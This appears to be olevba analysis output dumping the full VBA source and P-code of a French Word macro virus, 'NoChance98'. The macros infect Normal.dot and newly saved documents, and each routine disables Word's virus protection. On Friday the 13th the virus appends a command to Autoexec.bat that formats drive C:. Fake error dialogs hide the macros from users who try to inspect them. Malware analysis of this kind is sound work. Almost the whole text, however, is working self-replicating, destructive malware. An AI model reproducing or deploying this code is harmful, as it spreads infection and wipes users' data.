olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NoChance
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NoChance - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NoChance98.bas 
in file: Virus.MSWord.NoChance - OLE stream: 'Macros/VBA/NoChance98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.AutoExec"
'
' Macro créée par ZeMacroKiller
' La Charge
Application.EnableCancelKey = wdCancelDisabled  'Disable Ctrl + Attn
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPayload
Dim MyTime, MyDate, MyWeek
MyDate = Date
D$ = Mid(MyDate, 1, 2)
MyTime = Time
Th$ = Mid(MyTime, 1, 2)
Tm$ = Mid(MyTime, 4, 2)
Ts$ = Mid(MyTime, 7, 2)
MyWeek = WeekDay(MyDate, vbMonday)
If MyWeek = "7" Then
Message:
    MsgBox "On ne travaille pas le Dimanche...", vbExclamation, "C'est Dimanche et j'ai l'intention de me relaxer!"
GoTo Message
End If
If Th$ = "13" Then
    StatusBar = "C'est la CHANCE de ta vie...!!!"
End If
If Tm$ = "13" Then
    StatusBar = "La Chance tourne pour toi...!!!"
End If
If Ts$ = "13" Then
    StatusBar = "Tu as beaucoup de CHANCE...!!!"
End If
If (MyWeek = "5") And (D$ = "13") Then
    MsgBox "Pas de chance pour toi, aujourd'hui...", vbExclamation, "Vendredi 13"
    MsgBox "Je vais formater ton disque dur C: ", vbCritical, "Vendredi 13"
    MsgBox "C'est une blague...", vbInformation, "Vendredi 13"
    MsgBox "HAHAHAHAHA!", vbExclamation, "Vendredi 13"
    MsgBox "Soyez pas supersticieux...", vbExclamation, "Vendredi 13"
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "Cls"
    Print #1, "@Echo on"
    Print #1, "@Echo Tu te rappelle du message de Word:"
    Print #1, "@Echo Je vais formater votre disque dur C:"
    Print #1, "@Echo C'est pas une blague, c'est la vérité..."
    Print #1, "@Echo N'oublies pas que nous sommes VENDREDI 13..."
    Print #1, "@Echo Dommage pour toi"
    Print #1, "@Echo On y va..."
    Print #1, "@Echo y|Format c: /u"
End If
ErrorPayload:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.AutoOpen"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorInfectNormalTemplate
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NoChance98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
StatusBar = "Virus NoChance98 de ZeMacroKiller"
ErrorInfectNormalTemplate:
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.FileSaveAs"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
    Dialogs(wdDialogFileSaveAs).Show
On Error GoTo ErrorFSA
If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
    ActiveDocument.SaveAs Fileformat:=wdFormatTemplate
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NoChance98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.FileTemplates"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.ToolsMacro"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.ViewVBCode"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.NoChance - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.NoChance - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modèles actifs"
    ComboBox1.AddItem "Normal.dot (modèle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.NoChance
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/NoChance98 - 10459 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x001E " Macro créée par ZeMacroKiller"
' Line #3:
' 	QuoteRem 0x0000 0x000A " La Charge"
' Line #4:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	QuoteRem 0x0030 0x0013 "Disable Ctrl + Attn"
' Line #5:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	OnError ErrorPayload 
' Line #8:
' 	Dim 
' 	VarDefn MyTime
' 	VarDefn MyDate
' 	VarDefn MyWeek
' Line #9:
' 	Ld Date 
' 	St MyDate 
' Line #10:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #11:
' 	Ld Time 
' 	St MyTime 
' Line #12:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St Th$ 
' Line #13:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St Tm$ 
' Line #14:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St Ts$ 
' Line #15:
' 	Ld MyDate 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St MyWeek 
' Line #16:
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Label Message 
' Line #18:
' 	LitStr 0x0022 "On ne travaille pas le Dimanche..."
' 	Ld vbExclamation 
' 	LitStr 0x0031 "C'est Dimanche et j'ai l'intention de me relaxer!"
' 	ArgsCall MsgBox 0x0003 
' Line #19:
' 	GoTo Message 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld Th$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitStr 0x001F "C'est la CHANCE de ta vie...!!!"
' 	St StatusBar 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld Tm$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitStr 0x001F "La Chance tourne pour toi...!!!"
' 	St StatusBar 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld Ts$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitStr 0x001E "Tu as beaucoup de CHANCE...!!!"
' 	St StatusBar 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld MyWeek 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	Paren 
' 	Ld D$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #31:
' 	LitStr 0x0026 "Pas de chance pour toi, aujourd'hui..."
' 	Ld vbExclamation 
' 	LitStr 0x000B "Vendredi 13"
' 	ArgsCall MsgBox 0x0003 
' Line #32:
' 	LitStr 0x0023 "Je vais formater ton disque dur C: "
' 	Ld vbCritical 
' 	LitStr 0x000B "Vendredi 13"
' 	ArgsCall MsgBox 0x0003 
' Line #33:
' 	LitStr 0x0013 "C'est une blague..."
' 	Ld vbInformation 
' 	LitStr 0x000B "Vendredi 13"
' 	ArgsCall MsgBox 0x0003 
' Line #34:
' 	LitStr 0x000B "HAHAHAHAHA!"
' 	Ld vbExclamation 
' 	LitStr 0x000B "Vendredi 13"
' 	ArgsCall MsgBox 0x0003 
' Line #35:
' 	LitStr 0x001A "Soyez pas supersticieux..."
' 	Ld vbExclamation 
' 	LitStr 0x000B "Vendredi 13"
' 	ArgsCall MsgBox 0x0003 
' Line #36:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Cls"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "@Echo on"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "@Echo Tu te rappelle du message de Word:"
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "@Echo Je vais formater votre disque dur C:"
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "@Echo C'est pas une blague, c'est la vérité..."
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "@Echo N'oublies pas que nous sommes VENDREDI 13..."
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "@Echo Dommage pour toi"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "@Echo On y va..."
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "@Echo y|Format c: /u"
' 	PrintItemNL 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Label ErrorPayload 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub AutoOpen())
' Line #50:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #51:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #53:
' 	OnError ErrorInfectNormalTemplate 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "NoChance98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #57:
' 	LitStr 0x0021 "Virus NoChance98 de ZeMacroKiller"
' 	St StatusBar 
' Line #58:
' 	Label ErrorInfectNormalTemplate 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub FileSaveAs())
' Line #61:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #62:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #64:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #65:
' 	OnError ErrorFSA 
' Line #66:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #67:
' 	Ld wdFormatTemplate 
' 	ParamNamed Fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #68:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "NoChance98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #69:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #70:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #71:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Label ErrorFSA 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub FileTemplates())
' Line #76:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #77:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	OnError ErrorFT 
' Line #80:
' 	Ld UserForm900 
' 	ArgsMemCall Show 0x0000 
' Line #81:
' 	Label ErrorFT 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub ToolsMacro())
' Line #84:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #85:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #87:
' 	OnError ErrorTM 
' Line #88:
' 	Ld UserForm999 
' 	ArgsMemCall Show 0x0000 
' Line #89:
' 	Label ErrorTM 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ViewVBCode())
' Line #92:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #93:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #95:
' 	OnError ErrorVVBC 
' Line #96:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #97:
' 	Label ErrorVVBC 
' Line #98:
' 	EndSub 
' Macros/VBA/UserForm900 - 7097 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #5:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #6:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #10:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #15:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #20:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #21:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #25:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #30:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #34:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ld TextBox1 
' 	MemSt Then 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld CommandButton2 
' 	MemSt Enabled 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #38:
' 	EndSub 
' Macros/VBA/UserForm999 - 10046 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub ListBox1_Click())
' Line #4:
' 	LitDI2 0x0000 
' 	Ld ListBox1 
' 	ArgsMemLd Selected 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #7:
' 	LitVarSpecial (True)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #8:
' 	LitVarSpecial (True)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ListBox1 
' 	ArgsMemLd Selected 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #23:
' 	LitStr 0x000D "Commande Word"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #24:
' 	LitStr 0x0017 "Tous les modèles actifs"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #25:
' 	LitStr 0x001A "Normal.dot (modèle global)"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemLd WindowName$ 0x0000 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #29:
' Line #30:
' 	EndSub 
' Line #31:
' Line #32:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #33:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #34:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #37:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #41:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #42:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #46:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #51:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #52:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #56:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #57:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #61:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #62:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub ScrollBar1_Change())
' Line #65:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #66:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #67:
' 	EndSub 
' Line #68:
-------------------------------------------------------------------------------
